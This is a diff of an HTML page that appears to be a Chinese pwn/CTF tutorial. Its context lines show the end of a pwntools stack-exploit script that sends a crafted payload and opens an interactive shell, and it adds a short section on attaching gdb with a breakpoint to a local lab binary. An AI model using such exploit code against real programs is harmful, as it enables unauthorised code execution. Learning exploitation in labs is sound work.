@@ -510,6 +510,8 @@ payload <span class="token operator">=</span> flat<span class="token punctuation
 <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b16encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h4 id="pwntools打断点"><a href="#pwntools打断点" class="headerlink" title="pwntools打断点"></a>pwntools打断点</h4><pre class=" language-python"><code class="language-python">sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack-example'</span><span class="token punctuation">)</span>
+pwnlib<span class="token punctuation">.</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">"b *0x0804847b"</span><span class="token punctuation">)</span></code></pre>
 
             </div>
             <hr/>
